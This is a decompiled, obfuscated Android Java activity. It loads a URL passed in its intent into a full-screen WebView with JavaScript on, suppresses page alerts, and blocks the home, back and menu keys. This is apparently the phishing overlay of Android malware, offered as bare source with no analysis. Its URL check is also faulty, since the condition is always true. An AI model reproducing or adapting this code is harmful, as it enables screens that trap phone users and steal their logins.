package wocwvy.czyxoxmbauu.slsa.ncec;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.os.Bundle;
import android.view.KeyEvent;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import wocwvy.czyxoxmbauu.slsa.C0034b;
import wocwvy.czyxoxmbauu.slsa.C0039c;

public class khypzruy extends Activity {

    /* renamed from: a */
    C0039c f452a = new C0039c();

    /* renamed from: b */
    C0034b f453b = new C0034b();

    /* renamed from: wocwvy.czyxoxmbauu.slsa.ncec.khypzruy$a */
    private class C0052a extends WebChromeClient {
        private C0052a() {
        }

        public boolean onJsAlert(WebView webView, String str, String str2, JsResult jsResult) {
            return true;
        }
    }

    /* renamed from: wocwvy.czyxoxmbauu.slsa.ncec.khypzruy$b */
    private class C0053b extends WebViewClient {
        private C0053b() {
        }

        public void onPageFinished(WebView webView, String str) {
        }

        public boolean shouldOverrideUrlLoading(WebView webView, String str) {
            return false;
        }
    }

    public void onBackPressed() {
        super.onBackPressed();
    }

    /* access modifiers changed from: protected */
    @SuppressLint({"SetJavaScriptEnabled"})
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
    }

    public void onDestroy() {
        super.onDestroy();
    }

    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        return i == 3 || i == 4 || i == 82;
    }

    /* access modifiers changed from: protected */
    public void onStart() {
        super.onStart();
        String stringExtra = getIntent().getStringExtra("url");
        if (!stringExtra.equals("") || !stringExtra.equals(null)) {
            WebView webView = new WebView(this);
            webView.getSettings().setJavaScriptEnabled(true);
            webView.setScrollBarStyle(0);
            webView.setWebViewClient(new C0053b());
            webView.setWebChromeClient(new C0052a());
            webView.loadUrl(stringExtra);
            setContentView(webView);
        }
    }

    /* access modifiers changed from: protected */
    public void onStop() {
        super.onStop();
    }
}
